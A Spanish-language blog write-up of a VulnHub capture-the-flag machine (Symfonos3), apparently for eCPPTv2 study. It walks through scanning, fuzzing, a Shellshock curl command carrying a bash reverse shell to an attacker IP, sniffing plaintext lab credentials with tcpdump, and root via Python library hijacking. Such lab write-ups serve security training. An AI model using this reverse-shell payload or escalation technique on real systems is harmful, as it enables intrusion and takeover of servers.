---
layout: post
title: "Write Up Synfonos3. "
subtitle: "eCPPTv2 Track "
category: Blog
tags: [Medium,Chunin,Linux,VulnHub,Python-library-hijacking,Reconnaissance,Protocols,CronJob,Shellshock,WireShark,Network,Traffic,User-Pivoting,pcap,TcpDump,pspy64,Fuzzing-Web,eCPPTv2]
image:
  path: /assets/img/synfonos3/synfonos3.png
---

***

<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


```bash
sudo arp-scan -I ens33 --localnet
```

![list](/assets/img/synfonos3/1.png){:.lead width="800" height="100" loading="lazy"}


### Nmap


```bash
nmap -p- --open --min-rate 5000 -n -vvv -Pn -sS 192.168.1.59 -oA allports
```


![list](/assets/img/synfonos3/2.png){:.lead width="800" height="100" loading="lazy"}



### Services and Versions


```bash
nmap -sVC -Pn -n -p21,22,80 198.168.1.57 -oN target
```


![list](/assets/img/synfonos3/3.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis and Expltation


### HTTP TCP-80


Aunque tenemos el puerto 21 y 22 abiertos, no tenemos usuarios ni informacion para poder tratar de hacer algo asi que vamos a meternos de lleno en el servicio web, de pimeras en una web que solo contine una imagen por que no tenemos otra que fuzzear para en contrar directorios o algo, que podamos utilizar, si vemos el codigo fuente hay un comentario que nos dice que miremos en profundidad asi que vamos a revisar.


![list](/assets/img/synfonos3/1.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/synfonos3/5.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Comentario en la web.


Fuzzenado con ffuf en contramos un directorio **/gate** y un directorio **/cgi-bin/**, y este ultimo a mi me hace hace pensar en una vulnerabilidad llamda shellshock porque se refiere que ejecuta script en bash en el servidor, por otra parte vamos a seguier fuzzenado un poquito mas.


![list](/assets/img/synfonos3/7.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Directorio **/cgi-bin/** y **/gate**.


El el directorio **/gate** ha otro directorio llamado **/cerberus**, son un rabithole ya que no llevan a nada asi que nos vamos a concentrar en el directorio **/cgi-bin/**, que tiene un directorio llamado **/underworl/**, que vamos a husmear por lo que se ve y como dije antes esta ejecutando un scritp en bash que proociona la fecaha atual en el servidor.


![list](/assets/img/synfonos3/9.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/synfonos3/10.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/synfonos3/11.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Directorio **/underworl** en **/cgi-bin/**.


![list](/assets/img/synfonos3/12.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Script nmap que comprueba la vulnerabilidad Shellshock.


Para explotar el shellshock vamos a utilizar BurpSuite, o curl para otorgarnos una reverse-shell.

```bash
curl -H 'User-Agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/192.168.1.58/443 0>&1' 'http://172.16.30.6/cgi-bin/underworld'
```


![list](/assets/img/synfonos3/13.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Para ambos casos debemos pornernos ala escucha con netcat.


***

## Escalation Privileges


Primero, ejecutamos el comando **id** en Linux para obtener información sobre la identificación del usuario actual y los grupos a los que pertenece, ademas ejecutaremos **uname -a** y **lsb_release -a** para obtener información del sistema, verificaremossi otro usurio tiene permisos sudores con **sudo -l**, además, buscamos binarios con permisos **SUID** y tareas **Cron** en busca de posibles puntos de entrada. 


Si no encontramos resultados significativos con las acciones anteriores, procedemos a subir los binarios **linpeas** y **pspy** .etc, al sistema. Estos binarios nos ayudarán a realizar un análisis de reconocimiento más exhaustivo, identificando posibles vulnerabilidades o actividades sospechosas en el sistema.


También realizamos un análisis manual del sistema, buscando configuraciones inseguras, archivos sensibles o cualquier otra anomalía que pueda indicar una posible vulnerabilidad o actividad maliciosa.


Enumerando no conseguimos nada, pero es curioso que estamos en el grupo **pcap**, lo que sigininifica que con tcpdump podemos capturar el trafico de red **lo**, consiguiendo asi contraseña para el usuari hades que sabemos que existe enumerando el sitema asimo como el usuario **hades** y la contraseña que es **PTpZTfU4vxgzvRBE** de la siguiete forma.

```bash
tcpdump -i lo -w captura.pcap
```


![list](/assets/img/synfonos3/14.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Esperamos algunos segundos para capturar el trafico y vemos las creciales en texto claro usando **wireshark** o **Tshark** que son **hades:PTpZTfU4vxgzvRBE**.


### User Pivoting


Nos autenticamos como el usuario **hades** y ejecutamos pspy64 para capturar procesos encontramos una tarea cron que esta eejcutando con curl un peticon al loaclhos y esta guardando el resultado en un archivo llamado **statuscheck.txt** asi que vamos a averguar de que se trata, lo que pasa que **/opt/client/statuscheck.txt** es ruta que utiliza un script llamado **ftpclient.py** que levanta un sevidor web y guarda el resultado en el txt, lo interante esque es vulnerable a **Python library hijacking** porque carga una biblioteca de Python, en la que tenemos permisos de escritura como lo es **ftplib**.


![list](/assets/img/synfonos3/15.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Autenticamos como el usuario **hades** .


![list](/assets/img/synfonos3/16.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Tarea **cron**.


![list](/assets/img/synfonos3/18.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Script **ftpclient.py**, y buscamos la ruta donde se encuentra **ftplib**.


![list](/assets/img/synfonos3/20.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Injectamos el codigo para otogarnos una bash con privileguios root.


![list](/assets/img/synfonos3/19.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Los permisos de la bash Cambiaron a **S** de suid.


![list](/assets/img/synfonos3/21.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Ya podemos buscar la flag en elescritorio de root.

***

```bash
🎉 Felicitaciones ya has comprometido Synfonos3 de VunlHub 🎉
```
{:.centered}

***

Back to [Certification eCPPTv2](2023-07-06-Road-to-eCPPTv2.md){:.heading.flip-title}
{:.read-more}
